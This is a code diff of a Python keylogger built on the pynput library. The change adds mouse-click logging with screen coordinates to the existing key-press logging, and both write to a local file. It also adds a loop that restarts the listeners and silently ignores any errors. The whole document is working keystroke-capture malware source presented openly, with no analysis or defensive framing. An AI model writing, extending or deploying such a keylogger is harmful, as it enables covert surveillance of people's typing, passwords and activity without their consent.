@@ -1,15 +1,18 @@
-# Self-explanatory.
+from pynput import keyboard, mouse
+from os import _exit
+
+# Customize these values to your liking.
+
+# Name of the output file.
 KEYLOG_FILENAME = "keylog.txt"
 
-# Conversion of command names to characters. Customize this to your liking.
-CONVERSION_TABLE = {
+# Conversion of command names to characters.
+KEY_STRING_CONVERT = {
     "[SPACE]": " ",
     "[SHIFT]": "",
     "[SHIFT_R]": "",
     "[CTRL_L]": "",
     "[CTRL_R]": "",
-    "[ALT_L]": "",
-    "[ALT_R]": "",
     "[ALT_GR]": "",
     "[96]": "0",
     "[97]": "1",
@@ -30,43 +33,61 @@ CONVERSION_TABLE = {
     "[F12]": "[EXIT]", # Exit key
 }
 
-from pynput import keyboard
-from sys import exit
+# Format for the mouse click string. Customize this to your liking.
+MOUSE_STRING_FORMAT = "[{btn}_MC_{x},{y}]"
+
+
+# Writes a string to the keylog file
+def write_string(string):
+    print(string, end="")
+
+    with open(KEYLOG_FILENAME, "a+") as f:
+        f.write(string)
+
+    if (string == "[EXIT]"):
+        raise _exit(0)
+
 
 # Writes a key press to the keylog file
 def write_key(key):
-    letter = key2letter(key)
-
-    if (letter in CONVERSION_TABLE):
-        letter = CONVERSION_TABLE[letter]
-
-    with open(KEYLOG_FILENAME, "a+") as f:
-        f.write(letter)
-
-    if (letter == "[EXIT]"):
-        exit()
-
-# Converts key presses to letters or key names
-def key2letter(key):
     # Is a numpad key (weird behavior with these)
     if (hasattr(key, "vk") and key.vk >= 96 and key.vk <= 111):
-        return "[" + str(key.vk) + "]"
+        string = f"[{str(key.vk)}]"
 
-    # Is a letter
+    # Is an alphanumeric key
     elif (hasattr(key, "char") and key.char != None):
-        if (len(str(key)[1:-1]) == 4): # CTRL
-            return "[CTRL^" + str(chr(key.vk)) + "]"
-        else: # No CTRL
-            return str(key.char)
+        # escape sequence (CTRL + key)
+        if (len(str(key)[1:-1]) == 4):
+            string = f"[CTRL^{str(chr(key.vk))}]"
+        # no escape sequence
+        else:
+            string = str(key.char)
 
-    # Is a command
+    # Is a special key
     elif (hasattr(key, "name")):
-        return "[" + str(key.name).upper() + "]"
+        string = f"[{str(key.name).upper()}]"
 
     # Is anything else (fallback)
     else:
-        return "[" + str(key) + "]"
+        string = f"[{str(key)}]"
+
+    if (string in KEY_STRING_CONVERT):
+        string = KEY_STRING_CONVERT[string]
+
+    write_string(string)
+
+# Writes a mouse click to the keylog file
+def write_click(x, y, button, pressed):
+    if (pressed):
+        letter = MOUSE_STRING_FORMAT.format(btn=button.name.upper(), x=x, y=y)
+        write_string(letter)
+
 
 # Listens for key presses
-with keyboard.Listener(on_press=write_key) as lis: 
-    lis.join()
+while True:
+    try:
+        with keyboard.Listener(on_press=write_key) as key_list, mouse.Listener(on_click=write_click) as mouse_list:
+            key_list.join()
+            mouse_list.join()
+    except:
+        pass
